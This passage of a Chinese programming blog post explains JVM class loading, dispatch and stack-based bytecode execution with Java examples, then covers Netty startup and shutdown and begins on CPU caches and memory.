虚拟机规范给了严格规定，有且只有以下几种情况必须立即对类进行初始化：</p><pre><code>1、遇到new、putstatic、getstatic及invokestatic这4条字节码指令时，如果类没有初始化，则立即进行初始化，这4个命令分别代表实例化一个类、设置&amp;读取一个静态字段(没有被final修饰)、调用类的静态方法；2、使用java.lang.reflect包的方法对类进行反射调用的时候，如果类没有初始化；3、当初始化一个类的时候，发现其父类没有初始化；4、当虚拟机启动时，需用将执行启动的主类(有main()方法的那个类)进行初始化；5、当使用动态语言时，如果一个java.lang.invoke.MethodHandle实例最终的解析结果是REF_getStatic、REF_putStatic、REF_invokeStatic句柄时，并且这个句柄对应的类没有初始化。</code></pre><p>[x] 被动使用字段,导致类没有初始化. 对于必须初始化的反例<br> 例子： <code>@ classload.NotInitialization</code></p><h2 id="类与类加载器"><a href="#类与类加载器" class="headerlink" title="类与类加载器"></a>类与类加载器</h2><blockquote><p>对于任意一个类，都需要加载它得加载器和这个类本身一同确立其在Java虚拟机中得唯一性，对于类加载器，都拥有一个独立的类名称空间。<br> 两个类相同 包括代表类的Class对象的equals()方法，isAssignableFrom()方法，isInstance()方法返回结果，也包括使用instanceof关键字做对象所属关系判定等情况，如果未注意类加载器影响，在某些情况下可能会产生迷惑性结果。</p><p>例子： classload.ClassLoadDoubleClass</p></blockquote><blockquote><p>双亲委派</p><blockquote><p>如果一个类加载器收到了类加载的请求，它首先不会自己去尝试加载这个类，而是把这个请求委派给父类加载器去完成，每一个层次的类加载器都是如此，因此所有的加载请求<br> 最终都应该传送到顶层的启动类加载器中，只有当父加载器反馈自己无法完成这个加载请求(它搜索范围中没有找到所需要的类)时，子加载器才会尝试加载</p></blockquote><p>类加载之间是组合关系，非继承关系。<br>由于 类的相同需要与类加载绑定，所以使用双亲委派加载类可以保证rt.jar,bin/lib下面的类都是由系统自身的加载器加载，而不是用户自定义加载，导致多个相同得类存在。</p></blockquote><h2 id="虚拟机字节码执行引擎"><a href="#虚拟机字节码执行引擎" class="headerlink" title="虚拟机字节码执行引擎"></a>虚拟机字节码执行引擎</h2><h3 id="运行时栈帧结构"><a href="#运行时栈帧结构" class="headerlink" title="运行时栈帧结构"></a>运行时栈帧结构</h3><blockquote><p>栈帧（Stack Frame）是用于支持虚拟机进行方法调用和方法执行的数据结构。它是虚拟机运行时数据区中的虚拟机栈的栈元素。</p><p>栈帧存储了方法的局部变量表、操作数栈、动态连接和方法返回地址等信息。</p><p>每一个方法从调用开始至执行完成的过程，都对应着一个栈帧在虚拟机里面从入栈到出栈的过程。</p><blockquote><p>在编译程序代码的时候，栈帧中需要多大的局部变量表，多深的操作数栈都已经完全确定了。  因此一个栈帧需要分配多少内存，不会受到程序运行期变量数据的影响，而仅仅取决于具体的虚拟机实现。</p></blockquote></blockquote><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/image-20200923083340427.png" alt="image-20200923083340427"></p><h3 id="局部变量表"><a href="#局部变量表" class="headerlink" title="局部变量表"></a>局部变量表</h3><blockquote><p>局部变量表（Local Variable Table）是一组变量值存储空间，用于存放方法参数和方法内部定义的局部变量。并且在Java编译为Class文件时，就已经确定了该方法所需要分配的局部变量表的最大容量。</p></blockquote><p>局部变量表的容量以变量槽为最小单位，每个变量槽都可以存储32位长度的内存空间，例如boolean、byte、char、short、int、float、reference。</p><p>对于64位长度的数据类型（long，double），虚拟机会以高位对齐方式为其分配两个连续的Slot空间，也就是相当于把一次long和double数据类型读写分割成为两次32位读写。</p><blockquote><p>在方法执行时，虚拟机使用局部变量表完成参数值到参数变量列表的传递过程的，如果执行的是实例方法，那局部变量表中第0位索引的Slot默认是用于传递方法所属对象实例的引用。（在方法中可以通过关键字this来访问到这个隐含的参数）。<br>  其余参数则按照参数表顺序排列，占用从1开始的局部变量Slot。</p></blockquote><p><strong>Slot复用</strong></p><p>为了尽可能节省栈帧空间，局部变量表中的Slot是可以重用的，也就是说当PC计数器的指令指已经超出了某个变量的作用域（执行完毕），那这个变量对应的Slot就可以交给其他变量使用。</p><p>优点 ： 节省栈帧空间。</p><p>缺点 ： 影响到系统的垃圾收集行为。（如大方法占用较多的Slot，执行完该方法的作用域后没有对Slot赋值或者清空设置null值，垃圾回收器便不能及时的回收该内存。）</p><h3 id="方法调用"><a href="#方法调用" class="headerlink" title="方法调用"></a>方法调用</h3><p> 方法调用不同于方法执行，方法调用阶段的唯一任务就是确定被调用方法的版本（即调用哪一个方法），暂时还不涉及方法内部的具体运行过程。Class文件的编译过程中不包括传统编译器中的连接步骤，一切方法调用在Class文件里面存储的都是符号引用，而不是方法在实际运行时内存布局中的入口地址（直接引用）。也就是需要在类加载阶段，甚至到运行期才能确定目标方法的直接引用。</p><p><strong>解析</strong></p><p> 如前所述，所有的方法调用中的目标方法在Class文件里面都是一个常量池中的符号引用，在类加载阶段，会将其中的一部分符号引用转化为直接引用，这种解析能成立的前提是：<strong>方法在程序真正运行之前就有一个可确定的调用版本，并且这个方法的调用版本在运行期间是不可变的。</strong>也就是说，调用目标在程序代码写好、编译器进行编译时就必须确定下来，这类方法的调用成为解析。</p><p>   JAVA中符号“编译器可知、运行期不可变”的方法包括：<strong>静态方法、私有方法两大类。</strong>前者与类型直接关联，后者在外部不可被访问，这就决定了他们都不可能通过继承或别的方式重写其版本。因此都适合在类的加载阶段进行解析。</p><p>   JAVA虚拟机里面提供了5条方法调用字节码指令。分别如下：</p><p>   **invokestatic:**调用静态方法</p><p>   **invokespecial:**调用实例构造器<init>方法、私有方法和父类方法（super(),super.method()）。</p><p>   <strong>invokevirtual:**调用所有的虚方法(**静态方法、私有方法、实例构造器、父类方法、final方法都是非虚方法</strong>)。</p><p>   **invokeinterface:**调用接口方法，会在运行时期再确定一个实现此接口的对象。</p><p>   **invokedynamic:**现在运行时期动态解析出调用点限定符所引用的方法，然后再执行该方法，在此之前的4条指令，分派逻辑都是固化在虚拟机里面的，而invokedynamic指令的分派逻辑是由用户所设定的引导方法决定的。</p><p>   只要能被invokestatic和invokespecial指令调用的方法都可以在解析阶段中确定唯一的调用版本，符合这个条件的有静态方法、私有方法、实例构造器、父类方法4类，它们在类加载阶段就会把符号引用解析为该方法的直接引用。这些方法称为非虚方法（还包括使用final修饰的方法，虽然final方法使用invokevirtual指令调用，因为final方法注定不会被重写，也就是无法被覆盖，也就无需对其进行多态选择）。</p><p>   <strong>解析调用一定是一个静态的过程，在编译期间就可以完全确定，在类装载的解析阶段就会把涉及的符号引用全部转化为可确定的直接引用，不会延迟到运行期去完成。</strong>而<strong>分派调用</strong>可能是静态的也可能是动态的，根据分派一句的宗量数可分为单分派和多分派。因此分派可分为：静态单分派、静态多分派、动态单分派、动态多分派。</p><p> <strong>分派</strong></p><p><strong>1.静态分派（方法重载）：</strong></p><p>   先看一段代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"> 1 public class StaticDispatch &#123;</span><br><span class="line"> 2     static abstract class Human&#123;</span><br><span class="line"> 3 </span><br><span class="line"> 4     &#125;</span><br><span class="line"> 5     static class Man extends Human&#123;</span><br><span class="line"> 6 </span><br><span class="line"> 7     &#125;</span><br><span class="line"> 8     static class Woman extends  Human&#123;</span><br><span class="line"> 9 </span><br><span class="line">10     &#125;</span><br><span class="line">11     @Test</span><br><span class="line">12     public void test()&#123;</span><br><span class="line">13         Human man &#x3D; new Man();</span><br><span class="line">14         Human woman &#x3D; new Woman();</span><br><span class="line">15         StaticDispatch sr &#x3D; new StaticDispatch();</span><br><span class="line">16         sr.sayHello(man);</span><br><span class="line">17         sr.sayHello(woman);</span><br><span class="line">18 </span><br><span class="line">19     &#125;</span><br><span class="line">20 </span><br><span class="line">21 </span><br><span class="line">22     public void sayHello(Human guy)&#123;</span><br><span class="line">23         System.out.println(&quot;Hello guy&quot;);</span><br><span class="line">24     &#125;</span><br><span class="line">25     public void sayHello(Man guy)&#123;</span><br><span class="line">26         System.out.println(&quot;Hello man&quot;);</span><br><span class="line">27     &#125;</span><br><span class="line">28     public void sayHello(Woman guy)&#123;</span><br><span class="line">29         System.out.println(&quot;Hello woman&quot;);</span><br><span class="line">30     &#125;</span><br><span class="line">31 &#125;</span><br></pre></td></tr></table></figure><p>   运行结果为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hello guy</span><br><span class="line">Hello guy</span><br></pre></td></tr></table></figure><p>​    要解释上面的现象，先要说明几个概念，看如下代码。</p><p>   <strong>Human man = new Man();</strong></p><p>   上面一行代码中，Human成为变量man的<strong>静态类型</strong>，或者叫做外观类型，后面的Man则称为变量的<strong>实际类型</strong>，静态类型和实际类型在程序中都可以发生一些变化，区别是静态类型的变化仅仅在使用时发生（比如强制类型转换），<strong>变量本身的静态类型不会改变，并且最终的静态类型在编译器就是可知的；</strong>而<strong>实际类型变化的结果在运行期才可以确定，编译器在编译程序的时候并不知道一个对象的实际类型是什么。</strong></p><p>   比如如下代码：</p><p>  //实际类型变化</p><p>  Human man = new Man();</p><p>  Human woman = new Woman();</p><p>  //通过强转实现静态类型变化(变量本身静态类型不变)</p><p>  sr.sayHello((Man)man);</p><p>  sr.sayHello((Woman)woman);</p><p>​    <strong>虚拟机（编译器）在确定重载函数版本时是通过参数的静态类型而不是实际类型作为判定依据。因此，在编译阶段，编译器就可以根据静态类型确定使用哪个重载的版本。</strong></p><blockquote><p>见例子： <code>@ classload.Overload</code></p></blockquote><p><strong>2.动态分派（方法重写Override）：</strong></p><p>   为了说明动态分派的概念，先看一段代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"> 1 public class DynamicDispatch&#123;</span><br><span class="line"> 2     static abstract  class Human&#123;</span><br><span class="line"> 3         protected abstract void sayHello();</span><br><span class="line"> 4     &#125;</span><br><span class="line"> 5     static class Man extends Human&#123;</span><br><span class="line"> 6         @Override</span><br><span class="line"> 7         protected void sayHello()&#123;</span><br><span class="line"> 8          System.out.println(&quot;man say hello&quot;);</span><br><span class="line"> 9         &#125;</span><br><span class="line">10     &#125;</span><br><span class="line">11     static class Woman extends Human&#123;</span><br><span class="line">12         @Override</span><br><span class="line">13         protected void sayHello()&#123;</span><br><span class="line">14             System.out.println(&quot;woman say hello&quot;);</span><br><span class="line">15         &#125;</span><br><span class="line">16     &#125;</span><br><span class="line">17 </span><br><span class="line">18 19     public static void man(String[] args)&#123;</span><br><span class="line">20         Human man &#x3D; new Man();</span><br><span class="line">21         Human woman &#x3D; new Woman();</span><br><span class="line">22         man.sayHello();</span><br><span class="line">23         woman.sayHello();</span><br><span class="line">24         man &#x3D; new Woman();</span><br><span class="line">25         man.sayHello();</span><br><span class="line">26 </span><br><span class="line">27     &#125;</span><br><span class="line">28 </span><br><span class="line">29 &#125;</span><br></pre></td></tr></table></figure><p>   输出结果为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">man say hello</span><br><span class="line">woman say hello</span><br><span class="line">woman say hello</span><br></pre></td></tr></table></figure><p>   熟悉多态的人对上面的结果不会感到惊讶。下面使用javap命令输出这段代码的字节码。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/592743-20160322110744917-900187291.png" alt="img"></p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/592743-20160322110827979-422248272.png" alt="img"></p><p>​    如上所示，方法的调用指令都使用了invokevirtual指令，invokevirtual指令的运行时解析过程大致分为以下几个步骤。</p><p>​    1）找到操作数栈顶的第一个元素(对象引用)所指向的对象的<strong>实际类型</strong>，记作C；</p><p>​    2）如果在类型C中找到与常量中的描述符和简单名称都相符的方法，则进行访问权限校验，如果通过则返回这个方法的直接引用，查找过程结束；如果不通过，则返回java.lang.IllegalAccessError。</p><p>   3）否则，按照继承关系从下往上依次对C的各个父类进行第2步的搜索和验证。</p><p>   4）如果始终没有找到合适的方法，则抛出java.lang.AbstractMethodError异常。</p><p>   <strong>由于invokevirtual指令执行的第一步就是在运行期确定接收者的实际类型，这又是java语言中方法重写产生多态的本质。</strong></p><p><strong>3.单分派与多分派</strong></p><p>   方法的接收者和方法的参数统称为方法的宗量。根据分派基于多少种宗量，可以将分派划分为单分派和多分派。<strong>单分派是根据一个宗量对目标方法进行选择，多分派则是根据多于一个宗量对目标方法进行选择。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"> 1 import org.junit.Test;</span><br><span class="line"> 2 </span><br><span class="line"> 3 &#x2F;**</span><br><span class="line"> 4  * Created by chen on 2016&#x2F;3&#x2F;23.</span><br><span class="line"> 5  *&#x2F;</span><br><span class="line"> 6 public class Dispatch &#123;</span><br><span class="line"> 7     static class QQ&#123;</span><br><span class="line"> 8 </span><br><span class="line"> 9     &#125;</span><br><span class="line">10     static class _360&#123;</span><br><span class="line">11 </span><br><span class="line">12     &#125;</span><br><span class="line">13 </span><br><span class="line">14     public static class Father&#123;</span><br><span class="line">15         public void hardChoice(QQ  arg)&#123;</span><br><span class="line">16             System.out.println(&quot;father choose qq&quot;);</span><br><span class="line">17         &#125;</span><br><span class="line">18         public void hardChoice(_360  arg)&#123;</span><br><span class="line">19             System.out.println(&quot;father choose 360&quot;);</span><br><span class="line">20         &#125;</span><br><span class="line">21     &#125;</span><br><span class="line">22     public static class Son extends Father&#123;</span><br><span class="line">23         public void hardChoice(QQ  arg)&#123;</span><br><span class="line">24             System.out.println(&quot;son choose qq&quot;);</span><br><span class="line">25         &#125;</span><br><span class="line">26         public void hardChoice(_360  arg)&#123;</span><br><span class="line">27             System.out.println(&quot;son choose 360&quot;);</span><br><span class="line">28         &#125;</span><br><span class="line">29     &#125;</span><br><span class="line">30     @Test</span><br><span class="line">31     public void test()&#123;</span><br><span class="line">32         Father father &#x3D; new Father();</span><br><span class="line">33         Father son &#x3D; new Son();</span><br><span class="line">34         father.hardChoice(new _360());</span><br><span class="line">35         son.hardChoice(new QQ());</span><br><span class="line">36     &#125;</span><br><span class="line">37 &#125;</span><br></pre></td></tr></table></figure><p>   运行结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">father choose 360</span><br><span class="line">son choose qq</span><br></pre></td></tr></table></figure><p>   上述有关于hardChoice方法的两次调用，涉及了静态分派和动态分派的过程。</p><p>   首先看看编译阶段编译器的选择，也就是静态分派的过程(关于重载)。<strong>此时选择目标方法的依据有两点：一是静态类型是Father还是Son，而是方法参数是QQ还是_360。</strong>此处选择结果最终的产物是产生了两条invokevirtual指令，两条指令的参数分别是指向Father.hardChoice(_360)和Father.hardChoice(QQ)方法的符号引用。因为是根据两个宗量进行分派，所以java语言的静态分派属于多分派类型。</p><p>   再看看运行阶段虚拟机的选择，也就是动态分派的过程（关于重写），在执行“son.hardChoice(new QQ());”这句代码时，更准确的说，是在执行invokevirtual指令时，由于编译器已经确定了目标方法的签名必须是hardChoice(QQ)，虚拟机此时不会关心传过来的参数类型，也就是此时传过来的实际类型、静态类型都不会对产生任何影响。<strong>唯一可以对虚拟机的选择产生影响的就是此方法的接收者的实际类型是Father还是Son</strong>。因为只有一个宗量作为依据，所以java语言的动态分派属于单分派。</p><p><strong>4、虚拟机动态分派的实现</strong></p><p>   由于动态分派是非常频繁的动作，而且动态分派的方法版本选择过程需要运行时在类的方法元数据中搜索合适的目标方法，因此在虚拟机的实际实现中基于性能的考虑，大部分实现都不会真正的进行如此频繁的搜索。面对这种情况，最常用的“稳定优化”手段就是<strong>为类在方法区中建立一个虚方法表</strong>（vtable，熟悉C++的肯定很熟悉。于此对应的，在invokeinterface执行时也会用到接口方法表—itable），<strong>使用虚方法表索引来代替元数据查找以提高性能。</strong>具体如下图所示：</p><p>​    <img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/592743-20160322113550886-2079596000.png" alt="img"></p><p>   虚方法表中存放着各个方法的实际入口地址，如果某个方法在子类中没有被重写，那子类的虚方法表里面的地址入口和父类相同方法的入口地址是一致的，都指向父类的实现入口。如果子类重写了这个方法，子类方法表中的地址将会替换为指向子类实现版本的入口地址。如上图所示，Son重写了来自Father的全部方法，因此Son的方法表没有指向Father类型数据的箭头。但是Son和Father都没有重写来自Object的方法，所以他们的方法表中所有从Object继承来的方法都指向了Object的数据类型。</p><p>   为了程序实现上的方便<strong>，具有相同签名的方法，在父类、子类的虚方法表中都应当具有一样的索引号</strong>，这样当类型变换时，仅需要变更查找的方法表，就可以从不同的虚方法表中按照索引转换出所需要的方法入口地址。</p><p>   <strong>方法表一般在类加载阶段的连接阶段进行初始化</strong>，准备了类变量初始值之后，虚拟机会把该类的方法表也初始化完毕。</p><h3 id="基于栈的字节码解释执行引擎"><a href="#基于栈的字节码解释执行引擎" class="headerlink" title="基于栈的字节码解释执行引擎"></a>基于栈的字节码解释执行引擎</h3><p>Java编译器输出的指令流，基本上（是因为部分字节码指令会带有参数，而纯粹基于栈的指令集架构中应当全部都是零地址指令，也就是都不存在显式的参数。Java这样实现主要是考虑了代码的可校验性。）是一种基于栈的指令集架构（Instruction Set Arhitecture，ISA），指令流中的指令大部分都是零地址指令，他们依赖操作数栈进行工作。与之相对的另外一套常用的指令集架构是基于寄存器的指令集，最典型的就是x86的二地址指令集，说的通俗一些，就是现在我们主流PC机中直接支持的指令集架构，这些指令依赖寄存器进行工作。那么，基于栈的指令集与基于寄存器的指令集这两者之间有什么不同呢？<br>举个最简单的例子，分别使用这两种指令集计算“1+1”的结果，基于栈的指令集会是这样子的：</p><blockquote><p>iconst_1</p><p>iconst_1</p><p>iadd</p><p>istore_0</p></blockquote><p>两条iconst_1指令连续把两个常量1压入栈后，iadd指令把栈顶的两个值出栈、相加，然后把结果放回栈顶，最后istore_0把栈顶的值放到局部变量表的第0个Slot中。<br>如果基于寄存器，那程序可能会是这个样子：</p><blockquote><p>mov eax,1</p><p>add eax,1</p></blockquote><blockquote><p>mov指令把EAX寄存器的值设为1，然后add指令再把这个值加1，结果就保存在EAX寄存器里面。<br>了解了基于栈的指令集与基于寄存器的指令集的区别后，读者可能会有进一步的疑问，这两套指令集谁更好一些呢？<br>应该这么说，既然两套指令集会同时并存和发展，那肯定是各有优势的，如果有一套指令集全面优于另外一套的话，就不会存在选择的问题了。<br>基于栈的指令集主要优点就是可移植，寄存器由硬件直接提供，程序直接依赖这些硬件寄存器直接提供，程序直接依赖这些硬件寄存器则不可避免地要受到硬件的约束。例如，现在32位80x86体系的处理器中提供了8个32位的寄存器，而ARM体系的CPU（在当前的手机、PDA中相当流行的一种处理器）则提供了16个32位的通用寄存器。如果使用栈架构的指令集，用户程序不会直接使用这些寄存器，就可以由虚拟机实现来自行决定把一些访问最频繁的数据（程序计数器、栈顶缓存等）放到寄存器中以获取尽量好的性能，这样实现起来也更加简单一些。栈架构的指令集还有一些其他的优点，如代码相对更加紧凑（字节码中每个字节就对应一条指令，而多地址指令集中还需要存放参数）、编译器实现更加简单（不需要考虑空间分配的问题，所需空间都在栈上操作）等。<br>栈架构指令集的主要缺点是执行速度相对来说会稍慢一些。所有主流物理机的指令集都是寄存器架构也从侧面印证了这一点。<br>虽然栈架构指令集的代码非常紧凑，但是完成相同功能所需的指令数量一般会比寄存器架构多，因为出栈、入栈操作本身就产生了相当多的指令数量。更重要的是，栈实现在内存之中，频繁的栈访问也就意味着频繁的内存访问，相对于处理器来说，内存始终是执行速度的瓶颈。尽管虚拟机可以采取栈顶缓存的手段，把最常用的操作映射到寄存器中避免直接内存访问，但这也只能是优化措施而不是解决本质问题的方法。由于指令数量和内存访问的原因，所以导致了栈架构指令集的执行速度会相对较慢。</p></blockquote><h2 id="基于栈的解释器执行过程"><a href="#基于栈的解释器执行过程" class="headerlink" title="基于栈的解释器执行过程"></a>基于栈的解释器执行过程</h2><p>初步的理论知识已经讲解过了，本节准备了一段Java代码，看看在虚拟机中实际是如何执行的。下面准备了四则运算的例子，请看下面代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CalcTest</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">calc</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> a = <span class="number">100</span>;</span><br><span class="line"><span class="keyword">int</span> b = <span class="number">200</span>;</span><br><span class="line"><span class="keyword">int</span> c = <span class="number">300</span>;</span><br><span class="line"><span class="keyword">return</span> (a+b)*c;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从Java语言的角度来看，这段代码没有任何解释的必要，可以直接使用javap命令看看他的字节码指令，如下所示。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/image-20200923083527958.png" alt="image-20200923083527958"></p><p>javap提示这段代码需要深度为2的操作数栈和4个Slot的局部变量空间，根据这些信息画了下面共7张图，用他们来描述上面执行过程中的代码、操作数栈和局部变量表的变化情况。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/jvmsimple2.jpg" alt="img"></p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/jvmsimple3.jpg" alt="img"></p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/jvmsimple4.jpg" alt="img"></p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/jvmsimple5.jpg" alt="img"></p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/jvmsimple6.jpg" alt="img"></p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/jvmsimple7.jpg" alt="img"></p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/jvmsimple8.jpg" alt="img"></p><p>上面的执行过程仅仅是一种概念模型，虚拟机最终会对执行过程做一些优化来提高性能，实际运行过程不一定完全符合概念模型的描述……更准确地说，实际情况会和上面的字节码进行优化，例如，在HotSpot虚拟机中，有很多以“fast_”开头的非标准字节码指令用于合并、替换输入的字节码以提升解释执行性能，而即时编译器的优化手段更加花样繁多。<br>不过，我们从这段程序的执行中也可以看出栈结构指令集的一般运行过程，整个运算过程的中间变量都以操作数栈的出栈、入栈为信息交换途径，符合我们在前面分析的特点。</p><h2 id="netty"><a href="#netty" class="headerlink" title="netty"></a>netty</h2><p>在 Netty 中,通过 bootstrap.bind(PORT).sync().channel()方法绑定服务端端口,并不是在调用方的线程(示例为 main 线程)中执行,而是通过 NioEventLoop 线程执行。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/image-20200917223020699.png" alt="image-20200917223020699"></p><p>netty异步线程启动并非守护线程，在main方法中执行异步绑定端口后即main方法结束，JVM不会结束，需要等到netty异步线程结束或者调用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">worker.shutdownGracefully().sync();</span><br><span class="line">boss.shutdownGracefully().sync();</span><br></pre></td></tr></table></figure><p>结束netty的进程来结束JVM。</p><h3 id="实际项目中的优化策略"><a href="#实际项目中的优化策略" class="headerlink" title="实际项目中的优化策略"></a>实际项目中的优化策略</h3><p>初学者很容易出现上述案例中的错误用法，但在实际项目中，很少通过 main 函数直接调用 Netty 服务端，业务往往是通过某种容器（例如 Tomcat、SpringBoot 等）拉起进程，然后通过容器启动来初始化各种业务资源。因此，不需要担心 Netty 服务端意外退出，启动 Netty 服务端比较容易犯的错误是采用同步的方式调用 Netty，导致初始化 Netty 服务端的业务线程被阻塞，举例如下。</p><p>错误用法：这种用法会导致调用方的线程一直被阻塞，直到服务端监听句柄关闭。</p><p>◎ 初始化 Netty 服务端。</p><p>◎ 同步阻塞等待服务端端口关闭。</p><p>◎ 释放 I/O 线程资源和句柄等。</p><p>◎ 调用方线程被释放。</p><p>正确用法：服务端启动之后注册监听器监听服务端句柄关闭事件，待服务端关闭之后异步调用 shutdownGracefull 释放资源，这样调用方线程就可以快速返回，不会被阻塞。</p><p>◎ 初始化 Netty 服务端。</p><p>◎ 绑定监听端口。</p><p>◎ 向 CloseFuture 注册监听器，在监听器中释放资源。</p><p>◎ 调用方线程返回。</p><p>很多开发者习惯了写同步代码，在使用 Netty 之后仍然采用同步阻塞的方式来调用 Netty，尽管功能上也可以正常使用，但是违背了 Netty 的异步设计理念，线程执行效率并不高。</p><p>当系统退出时，建议通过调用 EventLoopGroup 的 shutdownGracefully 来完成内存队列中积压消息的处理、链路的关闭和 EventLoop 线程的退出，以实现停机不中断业务（备注：单靠 Netty 框架实际上无法 100% 保证，需要应用配合来实现）。</p><h2 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h2><h3 id="复杂的CPU与单纯的内存"><a href="#复杂的CPU与单纯的内存" class="headerlink" title="复杂的CPU与单纯的内存"></a>复杂的CPU与单纯的内存</h3><p>首先，我们澄清几个容易让人混淆的CPU术语。</p><blockquote><ul><li>Socket或者Processor：指一个屋里CPU芯片，盒装的或者散装的，上面有很多针脚，直接安装在主板上。</li><li>Core：指Socket里封装的一个CPU核心，每个Core都是完全独立的计算单元，我们平时说的4核CPU，就是指一个Socket(Processor)里封装了4个Core。</li><li>HT超线程：目前Intel与AMD的Processor大多支持在一个Core里并行执行两个线程，此时在操作系统看来就相当于两个逻辑CPU(Logical Processor),在大多数情况下，我们在程序里提到CPU这个概念时，就是指一个Logical Processor。</li></ul></blockquote><p>&nbsp; &nbsp; 然后，我们先从第一个非常简单的问题开始：CPU可以直接操作内存吗？可能99%的程序员会不假思索的回答：「肯定的，不然程序怎么跑。」如果理性地分析一下，你会发现这个回答有问题：CPU与内存条是独立的两个硬件，而且CPU上也没有插槽和连线可以让内存条挂上去，也就是说，CPU并不能直接访问内存条，而是要通过主办上的其他硬件(接口)来间接访问内存条。</p><p>&nbsp; &nbsp;第二个问题：CPU的运算速度与内存条的访问速度在回见的差距究竟有多大？这个差距跟王健林「先挣它个一个亿的」小目标和「普通人有车有房」的宏大目标之间的差距相比，是更大还是更小呢？答案是：「差不多」。通常来说，CPU的运算速度与内存访问速度之间的差距不过是100倍，假如有100万RMB就可以有有房(贷)有车(贷)了没那么其100倍就刚好是一亿RMB。</p><p>&nbsp; &nbsp;既然CPU的速度与内存的速度还是存在高度两个数量级的巨大鸿沟，所有它们注定不能「幸福地在一起」，于是CPU的亲密伴侣Cache闪亮登场。与来自DRAM家族的内存(Memory)出身不同，Cache来自ASRAM家族。DRAM与SRAM最简单的区别是后者特别快，容量特别小，电路结构非常复杂，造假特别高。</p><p>&nbsp; &nbsp;造成Cache与内存之间巨大性能差距的主要原因是工作原理和结构不同，如下所述。</p><blockquote><ul><li>DRAM存储一个数据只需要一个电容加一个晶体管，SRAM则需要6个晶体管。由于DRAM的数据其实是保存在电容里的，所以每次读写过程中的充放电环节也导致了DRAM读写数据有一个延迟的问题，这个延迟通常为十几到几十ns。</li><li>内存可以看做一个二维数据，每个存储单元都有其行地址和列地址。<br>由于SRAM的容量很小，所以存储单元的地址(行与列)比较短，可以一次性传输到SRAM中；而DRAM则需要分别传送行与列的地址。</li><li>SRAM的频率基本与CPU的频率保持一致；而DRAM的频率知道DDR4以后才开始接近CPU的频率。</li></ul></blockquote><p>&nbsp; &nbsp;Cache是被集成到CPU内部的一个存储单元，一级Cache(L1 